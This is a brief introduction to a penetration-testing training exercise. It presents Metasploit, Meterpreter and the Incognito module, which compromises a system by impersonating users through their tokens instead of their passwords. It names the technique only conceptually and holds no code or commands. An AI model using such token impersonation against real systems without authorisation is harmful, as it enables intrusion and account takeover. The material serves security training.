Working with Various Penetration Testing Tools

Metasploit framework is one of the key tools used in penetration testing. Other than this, you can also work with Meterpreter, which has the capability to run different types of modules for attacking a system. For example, you can work with the Incognito module, which does not require you to steal the user’s password for compromising a system. You can instead work with tokens and impersonate a user. It simplifies the process of compromising a system.

In this exercise, you will learn to work with various penetration testing tools.
